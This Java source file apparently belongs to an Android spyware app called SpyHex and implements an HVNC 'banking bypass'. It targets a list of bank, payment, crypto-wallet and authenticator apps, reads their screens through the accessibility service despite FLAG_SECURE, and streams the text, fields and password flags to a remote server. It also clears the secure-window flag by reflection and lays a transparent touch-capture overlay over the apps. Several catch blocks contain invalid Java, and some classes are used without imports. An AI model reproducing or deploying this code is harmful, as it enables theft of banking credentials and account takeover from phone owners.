package com.spyhex.app.features.hvnc;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import com.spyhex.app.core.SpyHexApp;

import org.json.JSONArray;
import org.json.JSONObject;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * HVNC Banking Bypass — Handles FLAG_SECURE apps by using multiple techniques:
 * 1. Accessibility tree extraction (reads view content even when screen is black)
 * 2. Reflection-based FLAG_SECURE clearing (on supported devices)
 * 3. Per-window capture (captures non-secure windows/dialogs)
 * 4. Overlay-based input capture (captures touch events over secure windows)
 */
public class HVncBankingBypass {
    private static final String TAG = "HVncBankBypass";
    private static final String[] BANKING_PACKAGES = {
        // International
        "com.chase.sig.android", "com.bankofamerica.bofa", "com.wf.wellsfargomobile",
        "com.citi.citimobile", "com.usbank.mobilebanking", "com.pnc.ecommerce.mobile",
        "com.td", "com.bbt.android", "com.suntrust.mobilebanking",
        "com.capitalone.mobile", "com.discoverfinancial.mobile", "com.americanexpress.android",
        "com.paypal.android.p2pmobile", "com.venmo", "com.squareup.cash",
        // UK/EU
        "com.barclays.android.barclaysmobilebanking", "com.hsbc.hsbcukmobilebanking",
        "com.lloydsbank.mobilebanking", "com.natwest.mobilebanking", "com.santander.uk",
        "com.starlingbank.android", "com.monzo.android", "com.revolut.revolut",
        "com.n26.android", "com.deutschebank.android", "com.ingbanking.mobil",
        // Asia
        "com.alipay.android.app", "com.tencent.mm", "com.unionpay",
        "com.icicibank.imobile", "com.sbi.SBIFreedomPlus", "com.axis.mobile",
        "com.hdfcbank.mobilebanking", "com.kotak811", "com.phonepe.app",
        "com.google.android.apps.nbu.paisa.user", "in.amazon.mShop.android.shopping",
        // Crypto/Finance
        "com.binance.dev", "com.coinbase.android", "io.metamask",
        "com.wallet.crypto.trustapp", "com.crypto.com", "com.okinc.okex.gp",
        // Other high-security
        "com.android.settings", "com.google.android.apps.authenticator2",
        "com.symantec.mobileid", "com.duosecurity.duomobile"
    };

    private static HVncBankingBypass instance;
    private final Context ctx;
    private final WindowManager wm;
    private final Handler mainHandler;
    private AccessibilityService accessibilityService;
    private boolean bypassEnabled = true;
    private boolean isBankingAppActive = false;
    private String currentBankingApp = "";
    private View captureOverlay;
    private final Map<String, JSONObject> lastTreeSnapshot = new HashMap<>();
    private final List<AccessibilityNodeInfo> nodePool = new ArrayList<>();

    private HVncBankingBypass() {
        this.ctx = SpyHexApp.getContext();
        this.wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        this.mainHandler = new Handler(Looper.getMainLooper());
    }

    public static synchronized HVncBankingBypass getInstance() {
        if (instance == null) instance = new HVncBankingBypass();
        return instance;
    }

    public void setAccessibilityService(AccessibilityService service) {
        this.accessibilityService = service;
    }

    /**
     * Main entry: called when accessibility event fires
     */
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!bypassEnabled || accessibilityService == null) return;

        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";

        // Detect banking app
        boolean wasBanking = isBankingAppActive;
        isBankingAppActive = isBankingPackage(pkg);

        if (isBankingAppActive) {
            currentBankingApp = pkg;
            if (!wasBanking) {
                Log.i(TAG, "Banking app detected: " + pkg + " — activating bypass");
                activateBypass();
            }
            // Extract accessibility tree
            AccessibilityNodeInfo root = accessibilityService.getRootInActiveWindow();
            if (root != null) {
                JSONObject tree = extractAccessibilityTree(root);
                lastTreeSnapshot.put(pkg, tree);
                sendTreeToServer(tree, pkg);
            }
        } else if (wasBanking) {
            Log.i(TAG, "Banking app closed — deactivating bypass");
            deactivateBypass();
            currentBankingApp = "";
        }
    }

    /**
     * Technique 1: Extract full accessibility tree as structured JSON
     * This bypasses FLAG_SECURE because accessibility reads view content, not pixels
     */
    private JSONObject extractAccessibilityTree(AccessibilityNodeInfo node) {
        JSONObject tree = new JSONObject();
        try {
            tree.put("class", node.getClassName() != null ? node.getClassName().toString() : "unknown");
            tree.put("pkg", node.getPackageName() != null ? node.getPackageName().toString() : "");
            tree.put("text", node.getText() != null ? node.getText().toString() : "");
            tree.put("contentDesc", node.getContentDescription() != null ? node.getContentDescription().toString() : "");
            tree.put("hint", node.getHintText() != null ? node.getHintText().toString() : "");
            tree.put("inputType", node.getInputType());
            tree.put("isPassword", node.isPassword());
            tree.put("isClickable", node.isClickable());
            tree.put("isFocusable", node.isFocusable());
            tree.put("isEditable", node.isEditable());
            tree.put("isChecked", node.isChecked());
            tree.put("isSelected", node.isSelected());
            tree.put("enabled", node.isEnabled());
            tree.put("visible", node.isVisibleToUser());

            Rect bounds = new Rect();
            node.getBoundsInScreen(bounds);
            JSONObject boundsJson = new JSONObject();
            boundsJson.put("left", bounds.left);
            boundsJson.put("top", bounds.top);
            boundsJson.put("right", bounds.right);
            boundsJson.put("bottom", bounds.bottom);
            tree.put("bounds", boundsJson);

            // Extract resource ID
            CharSequence resId = node.getViewIdResourceName();
            if (resId != null) {
                tree.put("resourceId", resId.toString());
            }

            // Recurse into children
            JSONArray children = new JSONArray();
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    children.put(extractAccessibilityTree(child));
                    child.recycle();
                }
            }
            tree.put("children", children);
            tree.put("childCount", node.getChildCount());
        } catch (Exception e) {
            Log.e(TAG, "Tree extraction error: " + e.getMessage());
        }
        return tree;
    }

    /**
     * Technique 2: Reflection-based FLAG_SECURE clearing
     * Attempts to clear FLAG_SECURE from all windows using reflection
     * Works on some OEM devices and older Android versions
     */
    public boolean clearFlagSecure() {
        try {
            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.R) {
                Log.w(TAG, "FLAG_SECURE reflection bypass limited on Android 12+");
            }

            // Get WindowManagerImpl
            Object windowManagerImpl = wm;
            if (windowManagerImpl == null) return false;

            // Access mParentWindow or mGlobalLock
            Class<?> wmClass = windowManagerImpl.getClass();
            Field mGlobalLock = wmClass.getDeclaredField("mGlobalLock");
            mGlobalLock.setAccessible(true);
            Object globalLock = mGlobalLock.get(windowManagerImpl);

            synchronized (globalLock) {
                // Access mWindows
                Field mWindowsField = wmClass.getDeclaredField("mWindows");
                mWindowsField.setAccessible(true);
                Object mWindows = mWindowsField.get(windowManagerImpl);

                if (mWindows instanceof ArrayList) {
                    ArrayList<?> windows = (ArrayList<?>) mWindows;
                    for (Object window : windows) {
                        Class<?> windowStateClass = window.getClass();

                        // Get mAttrs (WindowManager.LayoutParams)
                        Field mAttrsField = windowStateClass.getDeclaredField("mAttrs");
                        mAttrsField.setAccessible(true);
                        Object mAttrs = mAttrsField.get(window);

                        if (mAttrs != null) {
                            Class<?> lpClass = mAttrs.getClass();
                            Field flagsField = lpClass.getDeclaredField("flags");
                            flagsField.setAccessible(true);
                            int flags = (int) flagsField.get(mAttrs);

                            // Clear FLAG_SECURE (0x00002000)
                            int FLAG_SECURE = 0x00002000;
                            if ((flags & FLAG_SECURE) != 0) {
                                flags &= ~FLAG_SECURE;
                                flagsField.set(mAttrs, flags);
                                Log.i(TAG, "Cleared FLAG_SECURE from window");
                            }
                        }
                    }
                }
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Reflection bypass failed: " + e.getMessage());
            return false;
        }
    }

    /**
     * Technique 3: Create a secure VirtualDisplay that can capture secure content
     * Uses VIRTUAL_DISPLAY_FLAG_SECURE to create a display that sees secure windows
     */
    public VirtualDisplay createSecureVirtualDisplay(android.media.projection.MediaProjection mp,
                                                      int width, int height, int density,
                                                      android.view.Surface surface) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Use VIRTUAL_DISPLAY_FLAG_SECURE | VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY
                int flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_SECURE |
                           DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY;

                return mp.createVirtualDisplay("SpyHexSecureVNC",
                    width, height, density, flags, surface, null, null);
            }
        } catch (Exception e) {
            Log.e(TAG, "Secure VirtualDisplay failed: " + e.getMessage());
        }
        return null;
    }

    /**
     * Technique 4: Overlay-based touch capture
     * Creates a transparent overlay over the banking app to capture touch events
     * and relay them as accessibility actions
     */
    public void createTouchCaptureOverlay() {
        mainHandler.post(() -> {
            try {
                removeTouchOverlay();

                View overlay = new View(ctx) {
                    @Override
                    public boolean onTouchEvent(android.view.MotionEvent event) {
                        // Convert touch to accessibility action
                        if (accessibilityService != null && isBankingAppActive) {
                            float x = event.getRawX();
                            float y = event.getRawY();

                            AccessibilityNodeInfo node = findNodeAtPosition(x, y);
                            if (node != null) {
                                if (event.getAction() == android.view.MotionEvent.ACTION_DOWN) {
                                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                }
                                node.recycle();
                            }
                        }
                        return true;
                    }
                };

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                        ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                        : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    PixelFormat.TRANSPARENT
                );
                params.gravity = Gravity.TOP | Gravity.START;

                wm.addView(overlay, params);
                captureOverlay = overlay;
                Log.i(TAG, "Touch capture overlay created");
            } catch (Exception e) {
                Log.e(TAG, "Overlay creation failed: " + e.getMessage());
            }
        });
    }

    public void removeTouchOverlay() {
        if (captureOverlay != null) {
            try {
                wm.removeView(captureOverlay);
            } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
            captureOverlay = null;
        }
    }

    /**
     * Find accessibility node at screen position
     */
    private AccessibilityNodeInfo findNodeAtPosition(float x, float y) {
        if (accessibilityService == null) return null;
        AccessibilityNodeInfo root = accessibilityService.getRootInActiveWindow();
        if (root == null) return null;

        return findNodeRecursive(root, (int) x, (int) y);
    }

    private AccessibilityNodeInfo findNodeRecursive(AccessibilityNodeInfo node, int x, int y) {
        Rect bounds = new Rect();
        node.getBoundsInScreen(bounds);

        if (bounds.contains(x, y) && node.isClickable()) {
            return node;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo found = findNodeRecursive(child, x, y);
                if (found != null) {
                    return found;
                }
            }
        }
        return null;
    }

    /**
     * Technique 5: Window-based capture
     * Enumerates all windows and captures only non-secure ones
     * Dialogs, popups, and system windows often don't have FLAG_SECURE
     */
    public JSONObject enumerateWindows() {
        JSONObject result = new JSONObject();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                JSONArray windows = new JSONArray();
                List<AccessibilityWindowInfo> windowList = accessibilityService.getWindows();
                for (AccessibilityWindowInfo window : windowList) {
                    JSONObject w = new JSONObject();
                    w.put("id", window.getId());
                    w.put("type", window.getType());
                    w.put("layer", window.getLayer());
                    w.put("active", window.isActive());
                    w.put("focused", window.isFocused());
                    w.put("accessibilityFocused", window.isAccessibilityFocused());

                    AccessibilityNodeInfo root = window.getRoot();
                    if (root != null) {
                        w.put("pkg", root.getPackageName() != null ? root.getPackageName().toString() : "");
                        w.put("hasSecureFlag", hasFlagSecure(window));
                        root.recycle();
                    }
                    windows.put(w);
                }
                result.put("windows", windows);
                result.put("count", windowList.size());
            }
        } catch (Exception e) {
            Log.e(TAG, "Window enumeration failed: " + e.getMessage());
        }
        return result;
    }

    private boolean hasFlagSecure(AccessibilityWindowInfo window) {
        // Heuristic: banking app windows are likely secure
        try {
            AccessibilityNodeInfo root = window.getRoot();
            if (root != null) {
                String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                root.recycle();
                return isBankingPackage(pkg);
            }
        } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
        return false;
    }

    private void activateBypass() {
        // Try reflection first
        boolean reflectionOk = clearFlagSecure();

        // Create touch overlay for input capture
        createTouchCaptureOverlay();

        JSONObject status = new JSONObject();
        try {
            status.put("active", true);
            status.put("reflectionSuccess", reflectionOk);
            status.put("app", currentBankingApp);
            status.put("technique", reflectionOk ? "reflection+overlay" : "accessibility+overlay");
        } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }

        // Send status to server
        com.spyhex.app.core.network.SocketClient.getInstance().emit(
            Protocol.HVNC, status);
    }

    private void deactivateBypass() {
        removeTouchOverlay();
        isBankingAppActive = false;

        JSONObject status = new JSONObject();
        try {
            status.put("active", false);
            status.put("app", currentBankingApp);
        } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }

        com.spyhex.app.core.network.SocketClient.getInstance().emit(
            Protocol.HVNC, status);
    }

    private void sendTreeToServer(JSONObject tree, String pkg) {
        try {
            JSONObject payload = new JSONObject();
            payload.put("type", "accessibility_tree");
            payload.put("package", pkg);
            payload.put("timestamp", System.currentTimeMillis());
            payload.put("tree", tree);
            payload.put("isBanking", true);

            com.spyhex.app.core.network.SocketClient.getInstance().emit(
                Protocol.HVNC, payload);
        } catch (Exception e) {
            Log.e(TAG, "Send tree failed: " + e.getMessage());
        }
    }

    private boolean isBankingPackage(String pkg) {
        for (String bank : BANKING_PACKAGES) {
            if (pkg.equals(bank) || pkg.contains(bank)) {
                return true;
            }
        }
        return false;
    }

    public boolean isBankingAppActive() { return isBankingAppActive; }
    public String getCurrentBankingApp() { return currentBankingApp; }
    public JSONObject getLastTreeSnapshot() {
        JSONObject r = new JSONObject();
        try {
            r.put("snapshots", lastTreeSnapshot);
            r.put("count", lastTreeSnapshot.size());
        } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
        return r;
    }

    public void setBypassEnabled(boolean enabled) {
        this.bypassEnabled = enabled;
        if (!enabled && isBankingAppActive) {
            deactivateBypass();
        }
    }

    public JSONObject getStatus() {
        JSONObject s = new JSONObject();
        try {
            s.put("bypassEnabled", bypassEnabled);
            s.put("isBankingAppActive", isBankingAppActive);
            s.put("currentApp", currentBankingApp);
            s.put("hasOverlay", captureOverlay != null);
            s.put("treeSnapshots", lastTreeSnapshot.size());
        } catch (Exception ignored) { android.util.Log.e("SpyHex", "Error: " + Exception ignored.getMessage()); }
        return s;
    }
}
